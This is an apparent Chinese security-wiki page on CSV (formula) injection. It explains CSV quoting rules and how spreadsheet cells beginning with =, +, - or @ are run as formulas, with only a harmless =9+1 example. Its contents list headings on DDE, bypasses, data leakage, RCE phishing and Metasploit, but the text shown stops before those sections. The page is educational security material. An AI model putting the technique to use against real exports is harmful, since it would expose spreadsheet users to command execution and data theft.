<!doctype html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.9" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.33" />
    <style>
      html {
        background: var(--bg-color, #fff);
      }

      html[data-theme="dark"] {
        background: var(--bg-color, #1d1e1f);
      }

      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://github.com/zha0cai/SecWikiPublic/secwiki/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/CSV%20%E6%B3%A8%E5%85%A5.html"><meta property="og:site_name" content="One-Piece"><meta property="og:title" content="CSV 注入"><meta property="og:description" content="CSV 概述 CSV Wiki 逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。纯文本意味着该文件是一个字符 "字符 (计算机科学)")序列，不含必须像二进制数字那样被解读的数据。 CSV 格式在发展过程中也逐渐演变出其他一些分支和变种。..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2024-04-07T15:10:52.000Z"><meta property="article:author" content="Mr.zha0cai"><meta property="article:modified_time" content="2024-04-07T15:10:52.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"CSV 注入","image":[""],"dateModified":"2024-04-07T15:10:52.000Z","author":[{"@type":"Person","name":"Mr.zha0cai","url":"https://github.com/zha0cai"}]}</script><title>CSV 注入 | One-Piece</title><meta name="description" content="CSV 概述 CSV Wiki 逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。纯文本意味着该文件是一个字符 "字符 (计算机科学)")序列，不含必须像二进制数字那样被解读的数据。 CSV 格式在发展过程中也逐渐演变出其他一些分支和变种。...">
    <link rel="stylesheet" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css">
    <link rel="preload" href="/SecWikiPublic/secwiki/assets/js/runtime~app.e52a4695.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css" as="style"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/app.e30d6887.js" as="script">
    <link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/PostgreSQL Attack.html.fb8e7a60.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅳ).html.3baf6197.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅰ).html.4f251a52.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CORS 跨域漏洞.html.e56cc8f2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅲ).html.1a1c2485.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅱ).html.0f988b24.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/图片 XSS.html.eeb0e0e2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/URI 相关知识.html.6d4665c2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/nodejs 与 nvm、npm、pnmp、yarn、corepack 的关系.html.817dbbc8.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CSV 注入.html.882f01f7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/photo-swipe.7839c4e7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CDN 攻击指南.html.5700fa53.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/JdbcRowSetImpl JNDI 注入利用链.html.647d478e.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson payload 合集.html.e33685db.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Java 内省（Introspection）.html.dc61a88e.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/利用 TemplatesImpl 执行字节码.html.df09ef44.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Microsoft Windows MHTML 脚本代码注入漏洞.html.c437896d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/giscus.324c03f1.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/xss2pdf-制作.html.649d564a.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CRLF Injection.html.5f2ba8a6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/index.html.1fde67b2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/EXAMPLE_README.html.7027e490.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/404.html.8e08ef19.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="route-link vp-brand" href="/SecWikiPublic/secwiki/"><img class="vp-nav-logo" src="https://avatars.githubusercontent.com/u/111300972?v=4" alt><!----><span class="vp-site-name hide-in-pad">One-Piece</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link nav-link" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/websec/" rel="noopener noreferrer" target="_blank" aria-label="WebSec" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>WebSec<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/redteam/" rel="noopener noreferrer" target="_blank" aria-label="RedTeam" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span>RedTeam<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://theme-hope.vuejs.press/zh/" rel="noopener noreferrer" target="_blank" aria-label="V2 官方文档" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>V2 官方文档<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="vp-nav-item vp-action"><a class="vp-action-link" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="vp-nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span><span class="vp-sidebar-title">WebSec</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">RedTeam</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">代码审计</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-code" style=""></span><span class="vp-sidebar-title">Pwn</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-dev" style=""></span><span class="vp-sidebar-title">安全开发</span><span class="vp-arrow end"></span></button><!----></section></li><li><a href="https://plugin-md-enhance.vuejs.press/zh/guide/content/revealjs/demo.html" rel="noopener noreferrer" target="_blank" aria-label="幻灯片" class="nav-link vp-sidebar-link vp-sidebar-page"><span class="font-icon icon fa-fw fa-sm fas fa-person-chalkboard" style=""></span>幻灯片<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->CSV 注入</h1><div class="page-info"><span class="page-author-info" aria-label="作者🖊" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer">Mr.zha0cai</a></span><span property="author" content="Mr.zha0cai"></span></span><!----><span class="page-date-info" aria-label="写作日期📅" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2024-04-07T15:10:52.000Z"></span><!----><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 13 分钟</span><meta property="timeRequired" content="PT13M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc"><!--[--><!----><!--]--><div class="vp-toc-header">此页内容<button type="button" class="print-button" title="打印"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#分割符">分割符</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#dde">DDE</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#安全测试">安全测试</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#bypass">Bypass</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#excel">Excel</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#wps">WPS</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#泄露敏感信息">泄露敏感信息</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#rce-钓鱼">RCE 钓鱼</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#msf">MSF</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#环境条件">环境条件</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#漏洞挖掘-1">漏洞挖掘</a></li><!----><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><h1 id="csv-概述" tabindex="-1"><a class="header-anchor" href="#csv-概述"><span>CSV 概述</span></a></h1><p><strong><a href="https://zh.wikipedia.org/zh-cn/%E9%80%97%E5%8F%B7%E5%88%86%E9%9A%94%E5%80%BC" target="_blank" rel="noopener noreferrer">CSV Wiki<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></strong></p><p><strong>逗号分隔值</strong>（Comma-Separated Values，<strong>CSV</strong>，有时也称为<strong>字符分隔值</strong>，因为分隔字符也可以不是逗号），其文件以<mark>纯文本形式</mark>存储表格数据（数字和文本）。纯文本意味着该文件是一个字符 &quot;字符 (计算机科学)&quot;)序列，不含必须像二进制数字那样被解读的数据。</p><p>CSV 格式在发展过程中也逐渐演变出其他一些分支和变种。从名字（Comma-Separated-Value）可以看出，坚持使用逗号才是正规的做法。但有些程序也开始使用 Tab 或管道符（<code>|</code>​），甚至其他更多符号来进行分割。 在格式变化的同时，有的程序继续沿用 CSV 的名称，有的则引入了其他稍有变化的名字，比如 DSV（Delimiter-Separated Values）。这使得局面变得有点混乱，而这种混乱，到现在仍然在延续...</p><p>CSV 文件的格式不存在通用标准，也没有指定所使用的字符编码，但是在 <a href="https://datatracker.ietf.org/doc/html/rfc4180" target="_blank" rel="noopener noreferrer">RFC 4180<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 中有基础性的描述， 而 7-bit ASCII 是最基本的通用编码。</p><p><strong>公式注入（Formula Injection）攻击</strong></p><p>在 2013 年、2014 年就相继有人提出 Cell Injection、CSV Injection，将包含恶意命令的 excel 公式插入到可以导出 csv 或 xls 等格式的文本中，诱导受害者打开带有恶意公式的 Excel 文件，在打开文件后执行 Excel 公式。凡是带这种公式计算功能的表格处理软件或多或少都会受影响，如 WPS、LibreOffice 等等。</p><blockquote><p>CSV Injection is an attack technique first discovered by Context Information Security in <a href="http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/?ref=blog.zsec.uk" target="_blank" rel="noopener noreferrer">2014<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>.</p></blockquote><p>现在越来越多的云端产品都提供了数据<strong>导出为 CSV、xlsx 文件格式</strong>，如果能控制它们的数据源，并且未做内容验证，就可以触发公式注入，最近我在一些内部平台中就相继发现不少这类问题。</p><h1 id="csv-特性" tabindex="-1"><a class="header-anchor" href="#csv-特性"><span>CSV 特性</span></a></h1><h2 id="分割符" tabindex="-1"><a class="header-anchor" href="#分割符"><span>分割符</span></a></h2><ul><li><p>CSV 的基本格式是逗号分隔的一系列字段。同时规范要求，所有字段都可以用引用符号（通常是双引号 <code>&quot;</code>​​ ）包围起来。因此，以下两行数据在语义上是完全相同的：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>shenzhen,2019,china
&quot;shenzhen&quot;,&quot;2019&quot;,&quot;china&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>至于何时应该加引号、何时不加，规范并无明确要求，而是把这个决定留给应用程序。<strong>但如果字段内容中出现了逗号，为了避免歧义，就必须加上引号。</strong> 此外，如果字段内容中存在空白字符的话，为了明确起见，一般也建议加上。</p></li><li><p>如果字段内容中本来就有引号，该怎么办呢？<strong>那就需要在前面再加一个引号</strong>。</p><p>比如：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>shenzhen,2019,&quot;known as &quot;&quot;Special region&quot;&quot;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>你可能在某些地方看到类似 C 语言的转义符用方法：</p><div class="language-c line-numbers-mode" data-ext="c" data-title="c"><pre class="language-c"><code>shenzhen<span class="token punctuation">,</span><span class="token number">2019</span><span class="token punctuation">,</span><span class="token string">&quot;known as \&quot;Special region\&quot;&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>但这只是部分程序的行为，并不是规范的做法，也不为许多标准的 CSV 库所支持。</p><p>如果使用引号的话，还需要注意：按照规范要求，<strong><mark>引号与逗号之间不应该存在空白</mark></strong>。因此，下面的内容严格来说是非法的。</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>&quot;shenzhen&quot; , &quot;2019&quot; , &quot;china&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>但对于类似这样的错误该如何处理，标准也没有明确规定。有些“聪明”的软件会自动尝试去掉空格。</p></li><li><p>excel 的一个特性：单元格中的第一个字符是“<code>+</code>​、<code>-</code>​、<code>@</code>​、<code>=</code>​”这样的符号时，它会以一个表达式的形式被处理，不过在测试中发现 WPS 不会执行“<code>@</code>​”开头的。</p><p>例如，输入 <code>=9+1</code>​ 单元格会显示 10。</p></li></ul><p>​<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWgAAAB9CAYAAACPiflJAAAVPklEQVR4Ae2d+5MU1RXH5w+gyh/90d/8Zar8xSpiEtGqmBgVkyrKjDGAYoiPYJQYJD6wIIPEhFhqTIiikRJNQogjokYUEOIGAXksrMtu7y7sixWWlTcoLmhp1UlOz9zZ3tnunt4+d2bPdH+3qmtmuvvc7vmecz995vS9vZnPz39BZjk3fIGwQAPEAGIAMaAjBjLDF74kLNAAMYAYQAzoiwEAGhcoXKARA4gBpTEAQCt1DLIZfdkMfAKf1DsGAGgAGtkTYgAxoDQGAGiljqn3lRrHQ3aIGNAXAwA0AI3sCTGAGFAaAwC0Uscgm9GXzcAn8Em9YwCABqCRPSEGEANKYwCAVuqYel+pcTxkh4gBfTEAQAPQyJ4QA4gBpTEQCuiTpz+l7t4B6jrQjwUaJC4GOLY5xpE56ssco/ok6YwKBTQH8OHBo/TVV18T/qBAkhTgmObY5hiPCgPspw/kSWdUKKA5cwack4QlfBevAhzbHOMArz7wRvVJ0hlVFdDegMZ7KJA0BQDoxoUzQ5z9l+Q/ADrJ3sV3q6pAWgA9+MkJeub5VXT3r5bQdTfNoaunzqbpdzxMv1m6nPZ19NT8V8TOve30s3vz9O1rb3OPHzVDrrYfAF01xLEDFGhcBZIO6HPnv6BnV7xKV9/wU/rJHQ/Ri6+spY1NO+j9D5pp1Wvv0n0P/p4mf2c6PfDok3TyVG1umO5t209XfHcmLXz8Wfrvtr3U1tFr7YIAQDdu38OZQ4GqCiQZ0Aznx554gaZcfzv97V/riD/7ZaRbtrfQ1Jt/4QL88NBx33387KKuu/OXi+nh/J+st8vHB6Crhjh2gAKNq0CSAf2XF1914ex09VWF4/GTZyh3+